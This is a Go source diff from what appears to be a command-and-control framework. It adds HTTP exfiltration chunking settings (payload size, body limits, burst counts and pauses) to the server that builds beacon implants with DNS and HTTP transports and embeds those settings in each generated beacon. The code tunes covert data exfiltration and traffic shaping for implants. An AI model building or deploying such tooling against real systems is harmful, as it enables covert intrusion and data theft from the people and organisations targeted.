@@ -139,6 +139,14 @@ type ClientBuildRequest struct {
 	HTTPFallbackAfterFailures int                `json:"http_fallback_after_failures,omitempty"`
 	HTTPRetryBackoffSecs      int                `json:"http_retry_backoff_secs,omitempty"`
 
+	// HTTP result chunking. MaxPayload is the raw byte budget for one DATA chunk
+	// on an HTTP beacon; MaxBodyBytes clamps it to what the listener accepts.
+	// Both default to 0, which keeps the DNS-derived sizing.
+	HTTPMaxPayload     int `json:"http_max_payload,omitempty"`
+	HTTPMaxBodyBytes   int `json:"http_max_body_bytes,omitempty"`
+	HTTPChunksPerBurst int `json:"http_chunks_per_burst,omitempty"`
+	HTTPBurstPauseMs   int `json:"http_burst_pause_ms,omitempty"`
+
 	// Per-phase malleable configuration
 	RegistrationPhase *PhaseConfigRequest     `json:"registration_phase,omitempty"`
 	PollPhase         *PollPhaseConfigRequest `json:"poll_phase,omitempty"`
@@ -388,6 +396,23 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	}
 	if req.ExfilChunksPerBurst < 1 {
 		req.ExfilChunksPerBurst = 1
+	}
+
+	// HTTP result chunking defaults to what the listener will actually accept.
+	// Without this an HTTP build inherits the DNS label budget and sends 80 bytes
+	// per request despite a 1 MiB body allowance. An explicit request wins, and
+	// MaxBodyBytes still clamps it at the client.
+	if normalizeTransportMode(req.Transport) != "dns" {
+		if req.HTTPMaxBodyBytes == 0 && len(req.HTTPListeners) > 0 {
+			req.HTTPMaxBodyBytes = int(req.HTTPListeners[0].MaxBodyBytes)
+		}
+		if req.HTTPMaxPayload == 0 && req.HTTPMaxBodyBytes > 0 {
+			payload := req.HTTPMaxBodyBytes*5/8 - 128 // envelope: ids, indexes, separators
+			if payload < 1024 {
+				payload = 1024
+			}
+			req.HTTPMaxPayload = payload
+		}
 	}
 	if req.MaxSubdomainLength < 0 {
 		req.MaxSubdomainLength = 0
@@ -1139,6 +1164,12 @@ var embeddedConfig = Config{
 	BeaconName:           %q,
 	BuildID:              %q,
 	StagedRegistration:   %t,
+	HTTPExfil: HTTPExfilConfig{
+		MaxPayload:     %d,
+		MaxBodyBytes:   %d,
+		ChunksPerBurst: %d,
+		BurstPauseMs:   %d,
+	},
 	Registration: PhaseConfig{
 		QueryType:     %q,
 		Encrypted:     %t,
@@ -1193,6 +1224,7 @@ func getConfig() Config {
 		req.SleepMin, req.SleepMax, req.ExfilJitterMinMs, req.ExfilJitterMaxMs,
 		req.ExfilChunksPerBurst, req.ExfilBurstPauseMs, req.MaxSubdomainLength,
 		req.PayloadFormat, req.BeaconName, buildID, req.StagedRegistration,
+		req.HTTPMaxPayload, req.HTTPMaxBodyBytes, req.HTTPChunksPerBurst, req.HTTPBurstPauseMs,
 		regQT, regEnc, regMaxPayload, regPayloadFmt, regACKIP,
 		pollQT, pollEnc, pollMaxPayload, pollPayloadFmt, pollACKIP,
 		pollTaskIP, txtFollowUp,
